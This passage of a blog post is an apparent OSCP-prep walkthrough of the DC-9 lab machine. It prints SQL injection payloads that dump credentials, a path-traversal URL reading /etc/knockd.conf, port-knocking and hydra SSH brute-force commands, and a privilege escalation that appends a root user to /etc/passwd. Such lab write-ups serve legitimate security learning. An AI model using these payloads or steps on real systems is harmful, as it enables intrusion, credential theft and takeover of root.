+
+<p>Dump the username in localfile.</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">marym<br><span class="hljs-keyword">julied</span><br><span class="hljs-keyword"></span>fredf<br><span class="hljs-keyword">barneyr</span><br><span class="hljs-keyword"></span>tomc<br><span class="hljs-keyword">jerrym</span><br><span class="hljs-keyword"></span>wilmaf<br><span class="hljs-keyword">bettyr</span><br><span class="hljs-keyword"></span>chandlerb<br><span class="hljs-keyword">joeyt</span><br><span class="hljs-keyword"></span>rachelg<br>rossg<br>monicag<br>phoebeb<br><span class="hljs-keyword">scoots</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">janitor</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">janitor2</span><br></code></pre></td></tr></table></figure>
+
+<p>Then , I find a attack point in <strong>results.php</strong>,and that was SQL injection.</p>
+<p>Firstly,i try.</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>;#<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412220042466.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>So i continue with <strong>union</strong>.</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>;#<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412220335949.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>After test,i find it can’t Display multiple lines of information.So we can use <em>group_concat()</em> to bypass that.</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,group_concat(<span class="hljs-number">0</span>x7e,schema_name,<span class="hljs-number">0</span>x7e) from information_schema.schemata<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412221247878.png" srcset="/img/loading.gif" lazyload class="">
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,(select group_concat(<span class="hljs-number">0</span>x7e,table_name,<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=database());#<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412220902699.png" srcset="/img/loading.gif" lazyload class="">
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,group_concat(<span class="hljs-number">0</span>x7e,username,<span class="hljs-number">0</span>x7e,password,<span class="hljs-number">0</span>x7e) from users.UserDetails;#<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412221104078.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>dump password in localfile.</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">3</span>kfs<span class="hljs-number">86</span>sfd<br><span class="hljs-number">468</span>sfdfsd<span class="hljs-number">2</span><br><span class="hljs-number">4</span>sfd<span class="hljs-number">87</span>sfd<span class="hljs-number">1</span><br>RocksOff<br>TC&amp;TheBoyz<br>B<span class="hljs-number">8</span>m<span class="hljs-attr">#48</span>sd<br>Pebbles<br>BamBa<span class="hljs-name">m01</span><br>UrA<span class="hljs-name">G0</span>D!<br>Passw<span class="hljs-number">0</span>rd<br>y<span class="hljs-symbol">N72</span><span class="hljs-attr">#dsd</span><br><span class="hljs-attr">ILoveRachel</span><br><span class="hljs-attr">3248</span>dsds<span class="hljs-number">7</span>s<br>smellycats<br>YR<span class="hljs-number">3</span>BVxxxw<span class="hljs-number">87</span><br>Ilovepeepee<br></code></pre></td></tr></table></figure>
+
+<h2 id="Port-Knocking"><a href="#Port-Knocking" class="headerlink" title="Port Knocking"></a>Port Knocking</h2><p>Remember the filtered SSH port which might indicated a Port Knocking  method is used? As we now have access to the file system of our target,  we can try to locate the <em>knockd.conf</em> configuration file located by default at <em>&#x2F;etc&#x2F;</em> folder. This means our URL should be:<br> <code>http://192.168.137.4/manage.php?file=../../../../../../../../etc/knockd.conf</code></p>
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412221532885.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>Now we know the order of ports we need to hit with SYN packets in order  to open the SSH port - 7469,8475 and lastly 9842 port. Keep in mind the  order is important!</p>
+<p>We can use on of the follwoing methods:</p>
+<ol>
+<li><p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/knockd">knockd</a> - Need to be installed.</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">knock</span> <span class="hljs-number">192.168.137.4</span> <span class="hljs-number">7469</span> <span class="hljs-number">8475</span> <span class="hljs-number">9842</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/hping3">hping3</a> - pre-instlled on Kali. Use the following command to send 1 SYN packet to each port:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hping3</span> -S <span class="hljs-number">10.0.0.235</span> -p <span class="hljs-number">7469</span> -c <span class="hljs-number">1</span>; hping3 -S <span class="hljs-number">10.0.0.235</span> -p <span class="hljs-number">8475</span> -c <span class="hljs-number">1</span>; hping3 -S <span class="hljs-number">10.0.0.235</span> -p <span class="hljs-number">9842</span> -c <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat</a> - I’ll use this method as it is (manual but) easy.<br>We need to hit the port and CTRL+C in order to end the connection and move over to the next port.</p>
+</li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.137.4</span> <span class="hljs-number">7469</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.137.4</span> <span class="hljs-number">8475</span> <br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.137.4</span> <span class="hljs-number">9842</span> <br></code></pre></td></tr></table></figure>
+
+<p>then port 22 is open.</p>
+<h2 id="SSH-brute"><a href="#SSH-brute" class="headerlink" title="SSH brute"></a>SSH brute</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">hydra</span> <span class="hljs-selector-tag">-L</span> <span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">-P</span> <span class="hljs-selector-tag">password</span> <span class="hljs-selector-tag">ssh</span>:<span class="hljs-comment">//192.168.137.4</span><br><br><span class="hljs-selector-attr">[22]</span><span class="hljs-selector-attr">[ssh]</span> <span class="hljs-selector-tag">host</span>: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.4</span>   <span class="hljs-selector-tag">login</span>: <span class="hljs-selector-tag">chandlerb</span>   <span class="hljs-selector-tag">password</span>: <span class="hljs-selector-tag">UrAG0D</span>!                                                                       <br><span class="hljs-selector-attr">[22]</span><span class="hljs-selector-attr">[ssh]</span> <span class="hljs-selector-tag">host</span>: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.4</span>   <span class="hljs-selector-tag">login</span>: <span class="hljs-selector-tag">joeyt</span>   <span class="hljs-selector-tag">password</span>: <span class="hljs-selector-tag">Passw0rd</span>                                                                          <span class="hljs-selector-attr">[22]</span><span class="hljs-selector-attr">[ssh]</span> <span class="hljs-selector-tag">host</span>: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.4</span>   <span class="hljs-selector-tag">login</span>: <span class="hljs-selector-tag">janitor</span>   <span class="hljs-selector-tag">password</span>: <span class="hljs-selector-tag">Ilovepeepee</span><br></code></pre></td></tr></table></figure>
+
+<p>Got three valid username:password.</p>
+<p>ssh login.And we find new passoword when i login as janitor in <code>/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt</code>.Then add it to password file.</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">3</span>kfs<span class="hljs-number">86</span>sfd<br><span class="hljs-number">468</span>sfdfsd<span class="hljs-number">2</span><br><span class="hljs-number">4</span>sfd<span class="hljs-number">87</span>sfd<span class="hljs-number">1</span><br>RocksOff<br>TC&amp;TheBoyz<br>B<span class="hljs-number">8</span>m<span class="hljs-attr">#48</span>sd<br>Pebbles<br>BamBa<span class="hljs-name">m01</span><br>UrA<span class="hljs-name">G0</span>D!<br>Passw<span class="hljs-number">0</span>rd<br>y<span class="hljs-symbol">N72</span><span class="hljs-attr">#dsd</span><br><span class="hljs-attr">ILoveRachel</span><br><span class="hljs-attr">3248</span>dsds<span class="hljs-number">7</span>s<br>smellycats<br>YR<span class="hljs-number">3</span>BVxxxw<span class="hljs-number">87</span><br>Ilovepeepee<br>Hawaii-Five<span class="hljs-number">-0</span><br>BamBa<span class="hljs-name">m01</span><br>Passw<span class="hljs-number">0</span>rd<br>smellycats<br>P<span class="hljs-number">0</span>Lic<span class="hljs-attr">#10</span><span class="hljs-number">-4</span><br>B<span class="hljs-number">4</span>-Tru<span class="hljs-number">3</span><span class="hljs-number">-001</span><br><span class="hljs-number">4</span>uGU<span class="hljs-number">5</span>T-<span class="hljs-symbol">NiGHts</span><br></code></pre></td></tr></table></figure>
+
+<p>back to brute.</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">hydra</span> <span class="hljs-selector-tag">-L</span> <span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">-P</span> <span class="hljs-selector-tag">password</span> <span class="hljs-selector-tag">ssh</span>:<span class="hljs-comment">//192.168.137.4</span><br><br><span class="hljs-selector-attr">[22]</span><span class="hljs-selector-attr">[ssh]</span> <span class="hljs-selector-tag">host</span>: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.4</span>   <span class="hljs-selector-tag">login</span>: <span class="hljs-selector-tag">chandlerb</span>   <span class="hljs-selector-tag">password</span>: <span class="hljs-selector-tag">UrAG0D</span>!                                                                       <br><span class="hljs-selector-attr">[22]</span><span class="hljs-selector-attr">[ssh]</span> <span class="hljs-selector-tag">host</span>: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.4</span>   <span class="hljs-selector-tag">login</span>: <span class="hljs-selector-tag">joeyt</span>   <span class="hljs-selector-tag">password</span>: <span class="hljs-selector-tag">Passw0rd</span>                                                                          <span class="hljs-selector-attr">[22]</span><span class="hljs-selector-attr">[ssh]</span> <span class="hljs-selector-tag">host</span>: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.4</span>   <span class="hljs-selector-tag">login</span>: <span class="hljs-selector-tag">janitor</span>   <span class="hljs-selector-tag">password</span>: <span class="hljs-selector-tag">Ilovepeepee</span><br><span class="hljs-selector-attr">[22]</span><span class="hljs-selector-attr">[ssh]</span> <span class="hljs-selector-tag">host</span>: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.137</span><span class="hljs-selector-class">.4</span>   <span class="hljs-selector-tag">login</span>: <span class="hljs-selector-tag">fredf</span>   <span class="hljs-selector-tag">password</span>: <span class="hljs-selector-tag">B4-Tru3-001</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Privilege-up"><a href="#Privilege-up" class="headerlink" title="Privilege up"></a>Privilege up</h2><p>uh,a new one.login and <code>sudo -l</code>.</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/opt/devstuff</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> fredf on dc<span class="hljs-number">-9</span>:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> fredf may run the following commands on dc<span class="hljs-number">-9</span>:<br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /opt/devstuff/dist/test/test<br></code></pre></td></tr></table></figure>
+
+<p>run it ,get some hint.</p>
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412222508505.png" srcset="/img/loading.gif" lazyload class="">
+
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -type f -name &quot;test.py&quot; 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><br><span class="hljs-regexp">/opt/</span>devstuff/test.py<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages<span class="hljs-regexp">/setuptools/</span>command/test.py<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412222646923.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>this python script achieve a file read file write function.we can use it to add a root use to &#x2F;etc&#x2F;passwd.</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt salt passwd<br><span class="hljs-variable">$1</span><span class="hljs-variable">$salt</span><span class="hljs-variable">$XsMd08sxGRHdyFYPZh</span>/w01<br></code></pre></td></tr></table></figure>
+
+<p>In order to stay aligned with <code>/etc/passwd</code> file format, we need to add some extra details:</p>
+<ul>
+<li>username - <code>so1</code> in this case</li>
+<li>salted + hashed password - the string created by openssl</li>
+<li>UID - as we want to create root, we need to use <code>0</code></li>
+<li>GID - same as for UID</li>
+<li>home directory - we’ll use <code>/root</code></li>
+<li>shell - I prefer <code>bash</code>, you can also use <code>sh</code></li>
+</ul>
+<p>Which leave us with the following file content:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ cat <span class="hljs-regexp">/tmp/my</span>_user `so1:<span class="hljs-variable">$1</span><span class="hljs-variable">$salt</span><span class="hljs-variable">$XsMd08sxGRHdyFYPZh</span><span class="hljs-regexp">/w01:0:0::/</span>root:<span class="hljs-regexp">/bin/</span>bash` <br></code></pre></td></tr></table></figure>
+
+<p>Now we can execute the *<strong>test*</strong> script as sudo<br> <code>sudo ./test /tmp/my_user /etc/passwd</code></p>
+<p>cat &#x2F;etc&#x2F;passwd to verify user was added</p>
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412223022323.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>Switch to the new user and verify we’re root.</p>
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/image-20230412223057976.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>get proof</p>
+<img src="/2023/04/13/Road-to-OSCP-5-DC09/proof.png" srcset="/img/loading.gif" lazyload class="">
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP%E5%A4%87%E8%80%83/">#OSCP备考</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Road-to-OSCP-5-DC09</div>
+      <div>http://example.com/2023/04/13/Road-to-OSCP-5-DC09/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>So1Lupus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/05/07/Road-to-OSCP-6-Sauna/" title="Road-to-OSCP-6-Sauna">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Road-to-OSCP-6-Sauna</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/11/CVE-2018-2894-weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="CVE-2018-2894-weblogic-任意文件上传">
+                        <span class="hidden-mobile">CVE-2018-2894-weblogic-任意文件上传</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022029346号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
